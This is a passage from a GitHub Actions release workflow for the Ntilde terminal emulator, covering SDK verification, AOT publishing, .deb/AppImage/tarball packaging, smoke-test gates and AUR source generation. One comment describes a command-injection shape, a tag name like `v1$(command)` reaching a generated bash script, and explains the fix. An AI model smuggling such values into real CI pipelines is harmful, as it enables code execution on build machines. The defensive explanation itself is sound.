            # sidecars are a BARE hash with no filename, which `sha512sum -c` rejects
            # outright ("no properly formatted checksum lines found"). Taking field 1
            # of line 1 reads both shapes; the hex-digest assertion is what stops it
            # from quietly accepting an error page, a truncated body or an empty file
            # instead - without it, a garbage sidecar would compare unequal for the
            # wrong reason, or (if empty) not compare at all.
            expected="$(awk 'NR==1 { print tolower($1) }' "/tmp/$tarball.sha512")"
            [[ "$expected" =~ ^[0-9a-f]{128}$ ]] \
              || { echo "::error::$tarball.sha512 is not a SHA-512 hex digest (got '${expected:0:80}') - refusing to install an unverified SDK" >&2; exit 1; }
            actual="$(sha512sum "/tmp/$tarball" | awk '{ print tolower($1) }')"
            if [[ "$expected" != "$actual" ]]; then
              echo "::error::sha512 mismatch for $tarball" >&2
              echo "  expected: $expected" >&2
              echo "  actual:   $actual" >&2
              exit 1
            fi
            echo "sha512 verified for $tarball: $actual"
            mkdir -p "$HOME/.dotnet"
            tar -xzf "/tmp/$tarball" -C "$HOME/.dotnet"
            # A verified tarball of the wrong SHAPE would otherwise leave a $HOME
            # /.dotnet that PATH points at and nothing in it, failing later with a
            # confusing "dotnet: not found" instead of here.
            [[ -x "$HOME/.dotnet/dotnet" && -d "$HOME/.dotnet/sdk/$sdk_version" ]] \
              || { echo "::error::extracted SDK has no dotnet/sdk/$sdk_version - wrong payload shape" >&2; exit 1; }
          fi
          # Both entries. $HOME is /github/home in a container job, not /root, and
          # neither `dotnet` nor the global-tool shim dir that `dotnet tool install -g
          # vpk` writes into is on PATH here, unlike on the hosted runner image.
          echo "$HOME/.dotnet" >> "$GITHUB_PATH"
          echo "$HOME/.dotnet/tools" >> "$GITHUB_PATH"
          echo "DOTNET_ROOT=$HOME/.dotnet" >> "$GITHUB_ENV"

      - name: Verify dotnet is on PATH
        run: |
          set -euo pipefail
          command -v dotnet
          dotnet --version

      - name: Cache NuGet packages
        if: needs.release_metadata.outputs.cache_trusted == 'true'
        uses: actions/cache@v4
        with:
          path: ~/.nuget/packages
          key: nuget-container-ubuntu2204-${{ matrix.rid }}-${{ hashFiles('**/*.csproj') }}
          restore-keys: nuget-container-ubuntu2204-${{ matrix.rid }}-

      # The .so files built under the same ubuntu:22.04 container by
      # build_native_linux, so what ships is linked against the floor's glibc.
      - name: Download Native Artifact
        uses: actions/download-artifact@v4
        with:
          name: native-${{ matrix.os }}
          path: src/Ntilde.App/native

      - name: Restore
        run: dotnet restore

      # RELEASE_VERSION through env, never interpolated into script source: it derives
      # from a tag or a workflow_dispatch input and `$(...)` executes in bash. Same
      # rule as every other run block in this file. -p:SkipCliShim=true because the
      # shim needs a RID-less framework-dependent build and the AOT binary dispatches
      # the CLI modes itself.
      - name: Publish AOT
        env:
          SKIP_RUST_NATIVE_BUILD: "1"
          RELEASE_VERSION: ${{ needs.release_metadata.outputs.release_version }}
        run: |
          set -euo pipefail
          dotnet publish src/Ntilde.App/Ntilde.App.csproj \
            -c "$CONFIGURATION" -r ${{ matrix.rid }} --self-contained true \
            -p:PublishAot=true -p:SkipCliShim=true \
            "-p:Version=$RELEASE_VERSION" "-p:InformationalVersion=$RELEASE_VERSION" \
            -o artifacts/publish/${{ matrix.rid }}

      # BEFORE anything packages this directory, not after. StripSymbols=true
      # (Ntilde.App.csproj) emits a ~79 MB Ntilde.dbg beside the AOT
      # binary - larger than the binary itself - and every consumer below reads this
      # same directory: the tarball, the .deb, and vpk's full/delta nupkgs. Deleting
      # once at the source is why the tarball is not triple-sized; build-deb.sh does
      # its own .dbg removal and vpk gets a belt-and-braces --exclude, but neither
      # would have saved the tarball. Same reasoning, and the same 3x ratio, as the
      # macOS lane's dSYM deletion above. Nothing consumes the symbols.
      - name: Strip debug symbols and assert the native libraries survived
        run: |
          set -euo pipefail
          pubdir="artifacts/publish/${{ matrix.rid }}"
          rm -f "$pubdir"/*.pdb "$pubdir"/*.dbg
          ls -la "$pubdir"

          # A PTY-LESS BUNDLE OTHERWISE PASSES THIS ENTIRE LANE GREEN. Both Content
          # items that place these are `Condition="... and Exists(...)"`
          # (Ntilde.App.csproj:387-405), so a native library that did not survive
          # the cross-job artifact hop is not an error - the item is simply DROPPED, and
          # the csproj comment at :73-77 says what happens next: "the app ships with no
          # PTY". Nothing downstream would notice:
          #   - build-deb.sh:47 preflights only the Ntilde binary;
          #   - smoke-test.sh:87-88 derives its expected ELF count FROM THE FILES
          #     PRESENT (`so_total + 1`), so a bundle with one fewer .so just expects
          #     one fewer .so and passes;
          #   - the AppImage and tarball assert layout and mode bits, not contents.
          # That is another count-derived check that structurally cannot notice an
          # absence, so the absence is named explicitly here instead. A terminal
          # emulator shipping without a PTY is a total product failure, and this is two
          # `test -f` lines.
          #
          # Flat names, not the source paths: the <Link> metadata on both Content items
          # publishes them to the bundle root.
          for lib in librusty_pty.so librusty_ssh.so; do
            test -f "$pubdir/$lib" || {
              echo "FATAL: $lib is missing from $pubdir." >&2
              echo "The csproj Content item for it is Exists()-conditional, so this did NOT fail the publish - it silently shipped a bundle without it. librusty_pty.so missing means no PTY at all." >&2
              echo "Check that build_native_linux's artifact (native-${{ matrix.os }}) unpacked into src/Ntilde.App/native with its directory layout intact: librusty_pty.so is consumed from native/target_linux/release/ and librusty_ssh.so from native/rusty_ssh/target/release/." >&2
              exit 1
            }
            echo "ok: $lib present ($(stat -c '%s bytes, mode %a' "$pubdir/$lib"))"
          done

      - name: Build .deb
        env:
          RELEASE_VERSION: ${{ needs.release_metadata.outputs.release_version }}
        run: |
          set -euo pipefail
          chmod +x packaging/linux/*.sh
          packaging/linux/build-deb.sh \
            "artifacts/publish/${{ matrix.rid }}" "$RELEASE_VERSION" \
            ${{ matrix.debarch }} artifacts/deb

      # Recorded, not asserted, exactly as ci.yml does: the derived Depends: is a
      # function of what is installed on the packaging machine, so printing it makes
      # a toolchain-driven change visible in the log rather than only as a smoke-test
      # failure two jobs later.
      - name: Show derived Depends
        run: |
          set -euo pipefail
          deb="$(ls artifacts/deb/ntilde_*_${{ matrix.debarch }}.deb | head -1)"
          echo "$deb"
          dpkg-deb -f "$deb" Depends

      - name: Archive tarball
        # tar, NOT Compress-Archive. System.IO.Compression cannot write Unix mode
        # bits, so the zip this replaces shipped a Ntilde binary with no
        # executable bit and every user had to chmod +x before first launch. That is
        # the original bug, so the exec bit is asserted rather than assumed.
        env:
          RELEASE_TAG: ${{ needs.release_metadata.outputs.release_tag }}
          RID: ${{ matrix.rid }}
        run: |
          set -euo pipefail
          mkdir -p artifacts/release
          tarball="artifacts/release/ntilde-$RID-$RELEASE_TAG.tar.gz"
          tar -czf "$tarball" -C "artifacts/publish/$RID" .
          # Capture first, then match: `tar | grep` would hide a tar failure behind
          # grep's status, which is the vacuous-check shape this branch has already
          # been bitten by (see ci.yml's .dbg assertion).
          listing="$(tar -tvzf "$tarball")"
          # `^-rwx`, deliberately NOT `^-rwxr-xr-x`. The bug being guarded is "the
          # archive lost the executable bit", and the owner-exec bit is the whole of
          # that. Asserting the full 0755 triad would additionally assert an exact mode
          # that has never been OBSERVED anywhere: there is no tarball step in ci.yml,
          # so nothing has ever printed what `dotnet publish` emits for the AOT binary,
          # and this step first executes on a real tag. build-deb.sh is the evidence
          # that 0755 is an assumption rather than a fact - at :185-191 it chmods the
          # whole bundle to 0644 and then RE-ASSERTS 0755 on Ntilde specifically,
          # which is only necessary because the publish directory's modes are not
          # trusted. A stricter regex would therefore risk a false red on the
          # publishing lane - the worst possible place for one - while catching nothing
          # the loose one misses.
          grep -qE '^-rwx.* \./Ntilde$' <<<"$listing" \
            || { echo "tarball lost the executable bit on Ntilde - this is the bug the zip had" >&2
                 # `head -40 <<<...`, not `echo ... | head -40`: a here-string is
                 # a temp file bash has already written in full, so head reads a
                 # finished file rather than closing a pipe on a live writer -
                 # nothing here can take SIGPIPE and turn this diagnostic dump
                 # into a mangled exit code.
                 head -40 <<<"$listing" >&2
                 exit 1; }
          if grep -q '\.dbg$' <<<"$listing"; then
            echo "Ntilde.dbg leaked into the tarball - the Strip debug symbols step did not run, or ran too late" >&2
            exit 1
          fi
          echo "ok: tarball preserved the exec bit on ./Ntilde and carries no .dbg"

      # Pinned to 1.2.0, in lockstep with Directory.Packages.props and the other
      # install sites in these workflows.
      - name: Install vpk
        run: dotnet tool install -g vpk --version 1.2.0

      # --channel is MANDATORY on download as well as on pack. `vpk download github`
      # resolves its channel from the runner's OS (DefaultName.GetDefaultChannel
      # yields plain 'linux' here) - a channel we never publish - so without it this
      # step fetches nothing, no prior full lands in the output directory, and delta
      # generation silently degrades to full-only.
      #
      # continue-on-error because the FIRST release on a channel legitimately has
      # nothing to download. The Pack step below is what distinguishes that from a
      # transient failure, by asking GitHub rather than by inspecting this directory.
      - name: Download previous Velopack release (Linux, for delta generation)
        id: linux_download
        continue-on-error: true
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          RID: ${{ matrix.rid }}
        run: |
          set -euo pipefail
          mkdir -p artifacts/linux
          vpk download github \
            --repoUrl https://github.com/benyblack/ntilde \
            --token "$GH_TOKEN" \
            --channel "$RID" \
            --outputDir artifacts/linux

      - name: Pack AppImage (Velopack)
        env:
          RELEASE_TAG: ${{ needs.release_metadata.outputs.release_tag }}
          RELEASE_VERSION: ${{ needs.release_metadata.outputs.release_version }}
          DOWNLOAD_OUTCOME: ${{ steps.linux_download.outcome }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          RID: ${{ matrix.rid }}
        run: |
          set -euo pipefail
          ver="$RELEASE_VERSION"
          tag="$RELEASE_TAG"
          # The channel and the RID are intentionally the same string, so this is
          # correct by construction rather than by coincidence. It must keep matching
          # VelopackUpdateService.ResolveExplicitChannel
          # (src/Ntilde.App/Update/VelopackUpdateService.cs); never the platform
          # default 'linux', because a Velopack feed is per-channel and one shared
          # 'linux' channel would offer arm64 clients an x64 package.
          channel="$RID"

          # Whether a delta is EXPECTED must be decided from GitHub, not from this
          # directory. An empty artifacts/linux means two different things - "no prior
          # Velopack release on this channel" (legitimate, and the only correct outcome
          # on the first one) and "the download step failed" (transient). The download
          # step is continue-on-error so the first case cannot fail the release, which
          # means that without this query a FAILED download looks exactly like a first
          # release, no assertion fires, and the release publishes full-only -
          # permanently and silently dropping delta updates for every Linux client.
          # The win and osx lanes above learned this the same way.
          #
          # curl + jq, not `gh`: the GitHub CLI is installed on the runner host, not
          # inside this container. --fail-with-body makes a non-2xx an exit failure,
          # and capturing into a variable means `set -e` actually sees it - a bare
          # `curl | jq` would hand jq an error body and hide the failure.
          #
          # The filter mirrors what `vpk download github --channel "$channel"` itself
          # fetches: prereleases and drafts excluded (the same GitHub flag
          # create_release sets from the tag's SemVer suffix), and only this channel's
          # own -<channel>-full.nupkg assets counted. The suffix is unambiguous across
          # every channel we publish - linux-arm64, osx and win names cannot end in
          # "-linux-x64-full.nupkg" and vice versa - so unlike the win lane this needs
          # no exclusion clause.
          if ! releases_json="$(curl -sS --fail-with-body \
                -H "Accept: application/vnd.github+json" \
                -H "Authorization: Bearer $GH_TOKEN" \
                -H "X-GitHub-Api-Version: 2022-11-28" \
                "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/releases?per_page=100")"; then
            echo "Querying the releases API failed. Cannot tell a first $channel release from a transient failure, and guessing wrong publishes a release with no delta. Re-run this workflow for this tag." >&2
            # Echo the body. The whole point of --fail-with-body (rather than plain
            # --fail) is that on a non-2xx curl still writes GitHub's response, so
            # $releases_json holds the reason - "API rate limit exceeded", "Bad
            # credentials", "Not Found". Discarding it here would throw away the one
            # piece of information a maintainer needs and leave them re-running a
            # release blind. Truncated because an error body is short but a
            # misconfiguration could return an HTML page. Truncated by substring
            # expansion rather than `| head -c`, so this cannot take SIGPIPE and exit
            # 141 instead of the intended 1 - the same pipeline hazard documented in
            # ci.yml's linux_packaging_detect.
            api_error_body="${releases_json:-(empty response body)}"
            echo "--- GitHub API response body ---" >&2
            printf '%s\n' "${api_error_body:0:2000}" >&2
            echo "--------------------------------" >&2
            exit 1
          fi
          prior_full_raw="$(jq --arg tag "$tag" --arg suffix "-$channel-full.nupkg" '
            [ .[]
              | select(.tag_name != $tag)
              | select(.prerelease == false)
              | select(.draft == false)
              | .assets[]?
              | select(.name | endswith($suffix)) ] | length' <<<"$releases_json")"
          if [[ ! "$prior_full_raw" =~ ^[0-9]+$ ]]; then
            echo "The releases API query returned '$prior_full_raw', which is not a count. Refusing to guess whether a delta is expected." >&2
            exit 1
          fi
          prior_full_count=$((prior_full_raw))
          expect_delta=$(( prior_full_count > 0 ? 1 : 0 ))
          echo "Prior $channel full packages on GitHub (excluding $tag): $prior_full_count. Download step outcome: $DOWNLOAD_OUTCOME."

          if (( expect_delta )) && [[ "$DOWNLOAD_OUTCOME" != "success" ]]; then
            echo "A prior Velopack $channel release exists, but 'vpk download github' did not succeed (outcome: $DOWNLOAD_OUTCOME). Packing now would publish a full-only release and silently drop delta updates. Re-run this workflow for this tag once GitHub is reachable." >&2
            exit 1
          fi
          if (( expect_delta )); then
            echo "A delta is expected and will be asserted after packing."
          else
            echo "No prior Velopack $channel release; full-only output is the correct result."
          fi

          # Re-run idempotency, same as the win and osx lanes: `vpk download github`
          # picks the max-version full out of the channel feed, which for an
          # already-published tag is the tag's OWN nupkg, and `vpk pack` then hard-
          # fails with "There is a release in channel <c> which is equal or greater to
          # the current version". This workflow supports workflow_dispatch re-runs by
          # design, so dropping this version's own artifacts first is required.
          rm -f artifacts/linux/NtildeApp-"$ver"-"$channel"-*.nupkg

          # --packId NtildeApp, matching the win and osx lanes: it is the
          # updater's application identity and must not be "tidied" to Ntilde
          # (see the Windows lane's long comment on the uninstall hazard).
          # One --exclude, not two: `vpk pack --help` documents it as a single REGEX,
          # so both patterns are one alternation. mksquashfs (squashfs-tools) is a hard
          # prerequisite - a type-2 AppImage IS a squashfs image.
          vpk pack \
            --packId NtildeApp \
            --packVersion "$ver" \
            --packDir "artifacts/publish/$RID" \
            --mainExe Ntilde \
            --packTitle Ntilde \
            --packAuthors benyblack \
            --channel "$channel" \
            --icon src/Ntilde.App/Assets/ntilde_icon.png \
            --exclude '.*\.pdb|Ntilde\.dbg' \
            --outputDir artifacts/linux

          echo "Velopack output:"
          ls -l artifacts/linux

          test -f "artifacts/linux/NtildeApp-$ver-$channel-full.nupkg" \
            || { echo "vpk pack produced no NtildeApp-$ver-$channel-full.nupkg - the $channel update feed would be unusable." >&2; exit 1; }
          test -f "artifacts/linux/releases.$channel.json" \
            || { echo "vpk pack produced no releases.$channel.json" >&2; exit 1; }
          if (( expect_delta )) && [[ ! -f "artifacts/linux/NtildeApp-$ver-$channel-delta.nupkg" ]]; then
            echo "A prior Velopack $channel release exists but vpk pack produced no NtildeApp-$ver-$channel-delta.nupkg - delta generation silently failed." >&2
            exit 1
          fi

          # vpk names the AppImage from packId plus channel with NO version in it -
          # NtildeApp-linux-x64.AppImage - so it is matched by glob and renamed
          # to the tagged asset name, as the macOS lane renames its .pkg and .zip.
          # Do not assume a version appears in vpk's own output name.
          appimage="$(ls artifacts/linux/*.AppImage 2>/dev/null | head -1 || true)"
          if [[ -z "$appimage" ]]; then
            echo "vpk pack produced no .AppImage (is squashfs-tools installed? mksquashfs is required)" >&2
            exit 1
          fi
          mv "$appimage" "artifacts/release/ntilde-$RID-$tag.AppImage"

          # Stage everything the release will carry into ONE flat directory, because
          # that is both what smoke-test.sh takes as its argument and what the upload
          # job globs. Version-scoped, so a stale nupkg the download step fetched for
          # delta generation is never re-uploaded onto this release.
          # artifacts/deb, NOT artifacts/linux, and this is the reason the .deb gets a
          # directory of its own: artifacts/linux is vpk's --outputDir AND the target of
          # `vpk download github`, which deposits a PREVIOUS release's files there for
          # delta generation. Every neighbouring cp is version-scoped; this one cannot
          # be, because build-deb.sh maps a SemVer prerelease suffix to a Debian-legal
          # `~` and the exact filename is not derivable here. So instead of an unscoped
          # glob over a directory a downloader writes into, build-deb.sh gets its own
          # out-dir (argument 4, which it already takes) and this glob can only ever see
          # the .deb this run just built.
          cp artifacts/deb/ntilde_*_${{ matrix.debarch }}.deb artifacts/release/
          cp "artifacts/linux/NtildeApp-$ver-$channel-full.nupkg" artifacts/release/
          cp "artifacts/linux/releases.$channel.json" artifacts/release/
          if [[ -f "artifacts/linux/NtildeApp-$ver-$channel-delta.nupkg" ]]; then
            cp "artifacts/linux/NtildeApp-$ver-$channel-delta.nupkg" artifacts/release/
          fi
          echo "Staged for release:"
          ls -l artifacts/release

      # Mirrors ci.yml's Assert expected assets, in its hardened form - see that
      # step's comment for why the `unzip | grep` shape it replaced could pass while
      # inspecting nothing. Copying the fragile version into the lane that publishes
      # to users is exactly what this checks against.
      - name: Assert expected assets
        env:
          RELEASE_TAG: ${{ needs.release_metadata.outputs.release_tag }}
          RELEASE_VERSION: ${{ needs.release_metadata.outputs.release_version }}
          RID: ${{ matrix.rid }}
        run: |
          set -euo pipefail
          cd artifacts/release
          ls -la
          test -f "ntilde-$RID-$RELEASE_TAG.AppImage" || { echo "no AppImage" >&2; exit 1; }
          test -f "ntilde-$RID-$RELEASE_TAG.tar.gz" || { echo "no tarball" >&2; exit 1; }
          test -n "$(ls ./ntilde_*_${{ matrix.debarch }}.deb 2>/dev/null)" || { echo "no ${{ matrix.debarch }} .deb" >&2; exit 1; }
          test -f "NtildeApp-$RELEASE_VERSION-$RID-full.nupkg" || { echo "no $RID full nupkg" >&2; exit 1; }
          test -f "releases.$RID.json" || { echo "no releases.$RID.json" >&2; exit 1; }
          # No .dbg may appear in the full nupkg. `unzip` is preflighted and its
          # output captured BEFORE grepping: pipefail alone does not help, because a
          # non-zero pipeline inside an `if` condition is merely "false" and the step
          # would pass green having checked nothing.
          command -v unzip >/dev/null \
            || { echo "unzip is not installed, so the .dbg leak assertion cannot run. Add it back to the container toolchain step - do not let this check silently no-op." >&2; exit 1; }
          nupkg_listing="$(unzip -l "NtildeApp-$RELEASE_VERSION-$RID-full.nupkg")"
          if grep -q '\.dbg' <<<"$nupkg_listing"; then
            echo "Ntilde.dbg leaked into the $RID full nupkg" >&2
            exit 1
          fi
          echo "ok: all expected $RID assets present, no .dbg in the full nupkg"

      # The ONLY channel by which release_linux receives these, so this name and the
      # download step's name must stay in sync. NOT if: always() unlike ci.yml's
      # equivalent: an artifact set that failed its assertions must not be reachable
      # by a job whose next action after the gate is to publish it.
      - name: Upload Linux artifacts for the smoke gate
        uses: actions/upload-artifact@v4
        with:
          name: linux-release-${{ matrix.rid }}
          retention-days: 5
          path: artifacts/release

  # THE GATE, plus the only upload. Runs on a plain runner because both halves need
  # what a `container:` job does not have: a docker daemon (smoke-test.sh) - see the
  # block comment above publish_linux.
  release_linux:
    name: Release Linux (${{ matrix.rid }})
    runs-on: ${{ matrix.os }}
    # Two cold Debian smoke containers that each apt-install their own tooling, plus
    # - on the x64 leg only - three Arch containers that pacman-install theirs and
    # pull ~62 MB of dependencies. Raised from 30 when the Arch gate was added: that
    # lane measured 1m19s end to end in ci.yml including both image pulls, so the
    # headroom is ample rather than tight, but 30 left little room for a slow mirror
    # on top of the Debian gate. No compilation happens here.
    timeout-minutes: 45
    needs: [release_metadata, publish_linux]
    permissions:
      contents: write
    strategy:
      fail-fast: false
      matrix:
        include:
          - os: ubuntu-latest
            rid: linux-x64
          # An arm64 runner, not qemu on x64: the gate launches an arm64 AppImage and
          # installs an arm64 .deb, and `ubuntu:22.04` is multi-arch so the smoke
          # containers come up natively. UNVERIFIED, and note the extra assumption
          # this leg carries beyond the rest of the arm64 path - that the
          # ubuntu-24.04-arm image ships a working docker daemon. The step below
          # asserts it rather than discovering it as a confusing script failure.
          - os: ubuntu-24.04-arm
            rid: linux-arm64
    steps:
      # The scripts live in the repo; the artifacts come from publish_linux.
      - uses: actions/checkout@v4
        with:
          ref: ${{ needs.release_metadata.outputs.checkout_ref }}

      - name: Download Linux artifacts
        uses: actions/download-artifact@v4
        with:
          name: linux-release-${{ matrix.rid }}
          path: artifacts/release

      - name: Show downloaded artifacts
        run: ls -la artifacts/release

      - name: Verify docker and /dev/fuse are available
        run: |
          set -euo pipefail
          command -v docker >/dev/null \
            || { echo "no docker on ${{ matrix.os }}; the smoke gate cannot run, and skipping it is not an option - it is the only thing standing between an unverified bundle and the release page." >&2; exit 1; }
          docker version
          uname -m
          # The second prerequisite, and the less obvious one: smoke-test.sh's
          # Container 2 passes `--device /dev/fuse` so a type-2 AppImage can self-mount.
          # `docker run --device` on a node with no /dev/fuse fails hard with an opaque
          # error about the device path, which reads as a broken smoke script rather
          # than a missing kernel module. Name the prerequisite here instead. This is a
          # second unverified assumption about ubuntu-24.04-arm, alongside the docker
          # daemon above - neither has ever been observed on that image.
          test -e /dev/fuse \
            || { echo "no /dev/fuse on ${{ matrix.os }}; smoke-test.sh's Container 2 passes --device /dev/fuse for the AppImage self-mount and cannot start without it. Load the fuse module on the runner, or the gate has to be reworked - do not drop it." >&2; exit 1; }
          ls -l /dev/fuse

      # THE GATE. Everything above produced or moved artifacts; nothing has been
      # published. If this is ever made non-blocking or conditional, the lane has
      # lost its point.
      - name: Smoke test (bare containers)
        run: |
          set -euo pipefail
          chmod +x packaging/linux/*.sh
          packaging/linux/smoke-test.sh artifacts/release

      # AFTER the gate above, so the PKGBUILD can only ever describe a bundle that
      # has already installed and launched. x64 only, matching arch=('x86_64') in
      # the generated PKGBUILD - see packaging/arch/README.md for why arm64 waits.
      #
      # WHY THESE ARE RELEASE ASSETS AT ALL: the AUR stopped accepting new accounts
      # in 2026 after three supply-chain attack waves, with no announced restoration
      # date, so ntilde-bin cannot be pushed there yet. Shipping the two files
      # an AUR repo would contain lets an Arch user run `makepkg -si` against them
      # today, and they are byte-for-byte what gets pushed when registration reopens.
      #
      # THE SOURCE REF IS THE TAG'S OWN COMMIT, resolved by fetching the tag - not
      # HEAD. An earlier version of this step used HEAD and justified it by claiming
      # create_release builds the tag from inputs.target_commitish. IT DOES NOT: that
      # job passes only tag_name, generate_release_notes and prerelease, so for a
      # workflow_dispatch whose target_commitish differs from the ref the workflow was
      # dispatched on, the tag can resolve to a different commit than this checkout.
      #
      # The failure that causes is total and silent here, loud for users: the PKGBUILD
      # points its raw.githubusercontent URLs at the TAG while pinning sha256sums
      # computed from HEAD, so if the desktop entry, man page, icon or licence differ
      # between those two commits, every single `makepkg` run rejects the package on
      # an integrity check. Nothing in this lane would notice.
      #
      # Hashing whatever the tag actually resolves to makes the published PKGBUILD
      # self-consistent by construction, under every trigger.
      - name: Generate AUR sources
        if: matrix.rid == 'linux-x64'
        env:
          RELEASE_TAG: ${{ needs.release_metadata.outputs.release_tag }}
        run: |
          set -euo pipefail
          chmod +x packaging/arch/*.sh packaging/linux/*.sh
          # --depth=1: only the tag's own tree is needed, and this checkout is shallow.
          # create_release runs before publish_linux, which this job needs, so the tag
          # exists by now - if it does not, something is wrong upstream and saying so
          # here beats generating a PKGBUILD against the wrong commit.
          git fetch --depth=1 origin "refs/tags/$RELEASE_TAG" \
            || { echo "::error::cannot fetch $RELEASE_TAG; the PKGBUILD would pin checksums from an unrelated commit" >&2; exit 1; }
          tag_commit="$(git rev-parse "FETCH_HEAD^{commit}")"
          head_commit="$(git rev-parse HEAD)"
          echo "tag $RELEASE_TAG resolves to $tag_commit; this checkout is $head_commit"
          # create_release now passes target_commitish, so on a fresh tag these two
          # agree by construction. STILL NOT FATAL, because one legitimate case
          # remains: re-dispatching an EXISTING tag against updated code - the
          # recovery path documented above publish_linux. GitHub ignores
          # target_commitish when the tag already exists, so the tag keeps pointing
          # at the old commit while this job builds the new one. The PKGBUILD stays
          # correct either way (it hashes whatever the tag resolves to, which is what
          # raw.githubusercontent will serve), but the bundle and the tag genuinely
          # describe different code and that is worth seeing rather than absorbing.
          #
          # Outside that case, this firing means target_commitish stopped reaching
          # create_release - i.e. the fix regressed.
          if [[ "$tag_commit" != "$head_commit" ]]; then
            echo "::warning::$RELEASE_TAG points at $tag_commit but this job built $head_commit - the AUR sources follow the tag, the bundle does not"
          fi
          # QUOTED heredoc, and the tag reaches the container as DATA, never as script
          # text. The previous version interpolated $RELEASE_TAG into the generated
          # script with an unquoted heredoc, which is the injection hole this file
          # already warns about for `run:` blocks (see release_metadata's env block,
          # githubactions:S7630) - git accepts ref names like `v1$(command)`, a
          # workflow_dispatch chooses tag_name freely, and the substituted text would
          # have been parsed by `bash /gen.sh` inside a container that has the release
          # artifacts bind-mounted. build-arch.sh does validate the tag shape, but only
          # after it has already run, which is too late to be the defence.
          #
          # Passed through a file read with `read -r`, not through the environment:
          # `su` does not reliably carry unrelated variables across, and `su -p` would
          # keep root's HOME, which makepkg needs writable. `read` treats the bytes as
          # data under every shell.
          printf '%s\n%s\n' "$RELEASE_TAG" "$tag_commit" > /tmp/gen-aur.args
          cat > /tmp/gen-aur.sh <<'EOF'
          set -euo pipefail
          IFS= read -r RELEASE_TAG < /gen.args
          TAG_COMMIT="$(sed -n '2p' /gen.args)"
          [[ -n "$RELEASE_TAG" ]] || { echo "no tag passed into the container" >&2; exit 1; }
          [[ "$TAG_COMMIT" =~ ^[0-9a-f]{40}$ ]] || { echo "no commit sha passed into the container" >&2; exit 1; }
          git config --global --add safe.directory /w
          packaging/arch/build-arch.sh "$RELEASE_TAG" artifacts/aur --tarball "artifacts/release/ntilde-linux-x64-$RELEASE_TAG.tar.gz" --source-ref "$TAG_COMMIT"
          EOF
          cat /tmp/gen-aur.sh
          # Unprivileged: makepkg refuses to run as root, and .SRCINFO is the file
          # the AUR rejects a push without.
          # HOST_UID for the same reason smoke-test.sh maps it: /w is a bind mount, so
          # the uid the container writes is the uid on the host. A container-local
          # builder would leave artifacts/aur owned by a stranger, and the runner
          # could then read it but not WRITE into it - which the smoke gate below
          # must, to seed the tarball beside the PKGBUILD.
          docker run --rm -v "$PWD:/w" -v /tmp/gen-aur.sh:/gen.sh:ro -v /tmp/gen-aur.args:/gen.args:ro -w /w \
            -e HOST_UID="$(id -u)" -e HOST_GID="$(id -g)" \
            archlinux:base-devel bash -euo pipefail -c '
            pacman -Syu --noconfirm --needed git >/dev/null
            uid="${HOST_UID:-1000}"
            gid="${HOST_GID:-1000}"
            if [ "$uid" = "0" ]; then uid=1000; gid=1000; fi
            groupadd -g "$gid" builder 2>/dev/null || true
            useradd -m -u "$uid" -g "$gid" builder 2>/dev/null || useradd -m -u "$uid" builder
            mkdir -p /w/artifacts/aur
            chown -R "$uid":"$gid" /w/artifacts/aur
            su builder -c "bash /gen.sh"
          '
          # -s, not -f: a failed `makepkg --printsrcinfo > .SRCINFO` leaves a
          # zero-byte file behind, which `test -f` would accept.
          test -s artifacts/aur/PKGBUILD || { echo "::error::no PKGBUILD generated" >&2; exit 1; }
          test -s artifacts/aur/.SRCINFO || { echo "::error::no .SRCINFO generated" >&2; exit 1; }
          # The sha256 in the PKGBUILD must be the sha256 of the tarball THIS job is
          # about to upload. build-arch.sh computed it from that exact file, so this
          # cannot drift - which is precisely why it is worth asserting rather than
          # assuming: a future refactor that passed --sha256 from somewhere else, or
          # pointed --tarball at a different path, would publish a PKGBUILD whose
          # integrity check fails for every user and for nobody here.
          tarball_sha="$(sha256sum "artifacts/release/ntilde-linux-x64-$RELEASE_TAG.tar.gz" | awk '{print $1}')"
          grep -q "sha256sums_x86_64=('$tarball_sha')" artifacts/aur/PKGBUILD \
            || { echo "::error::the generated PKGBUILD does not pin the tarball being published ($tarball_sha)" >&2; exit 1; }
          grep -q "^pkgbase = ntilde-bin$" artifacts/aur/.SRCINFO \
            || { echo "::error::.SRCINFO is not a ntilde-bin srcinfo" >&2; exit 1; }
          # Named for the tag, because a release page holds one flat namespace and
          # "PKGBUILD" alone says nothing about which version it builds.
          cp artifacts/aur/PKGBUILD "artifacts/release/PKGBUILD-$RELEASE_TAG"
          cp artifacts/aur/.SRCINFO "artifacts/release/SRCINFO-$RELEASE_TAG"
          echo "--- PKGBUILD ---"; cat artifacts/aur/PKGBUILD

      # THE ARCH GATE, and it belongs here rather than only in ci.yml for two reasons
      # that together leave a real hole otherwise (Codex P2 on #455):
      #
      #   1. ci.yml's Arch lane is PATH-FILTERED. A release that changes the app or
      #      the native payload without touching packaging/** never runs it at all.
      #   2. Even when it does run, it tests the newest PREVIOUSLY PUBLISHED stable
      #      tarball - not this one.
      #
      # So a newly introduced Arch-incompatible linked or dlopen'd dependency would
      # ship with nothing having installed or launched the package built from the
      # tarball being published. The .deb smoke gate above cannot see it either: its
      # dependency derivation is Debian's.
      #
      # HOW IT CAN RUN AT ALL before the upload: the PKGBUILD points at a release URL
      # that 404s until the step below. smoke-test.sh seeds any tarball sitting beside
      # the PKGBUILD into the build directory, and makepkg skips downloading a source
      # already present while still validating its sha256 - verified against a real
      # makepkg with the release host replaced by an unreachable one ("-> Found
      # ntilde-linux-x64-v0.8.0.tar.gz", checksum passed). The other four
      # sources come from raw.githubusercontent at the tag, which exists by now.
      #
      # This widens what can fail before any Linux asset publishes, deliberately:
      # that is what a gate is. It is the same bargain the .deb smoke test above
      # already makes.
      - name: Smoke test the AUR package (Arch containers)
        if: matrix.rid == 'linux-x64'
        env:
          RELEASE_TAG: ${{ needs.release_metadata.outputs.release_tag }}
        run: |
          set -euo pipefail
          chmod +x packaging/arch/*.sh packaging/linux/*.sh
          cp "artifacts/release/ntilde-linux-x64-$RELEASE_TAG.tar.gz" artifacts/aur/
          packaging/arch/smoke-test.sh artifacts/aur

      # Only now. The .deb is globbed rather than named because build-deb.sh maps a
      # SemVer prerelease suffix into a Debian-legal `~` (0.5.0-beta.1 ->
      # 0.5.0~beta.1), so its exact filename is not derivable from release_version
      # without reimplementing that mapping. The directory holds exactly one
      # architecture's .deb, so the glob is unambiguous.
      #
      # fail_on_unmatched_files is left at its permissive default on purpose: the
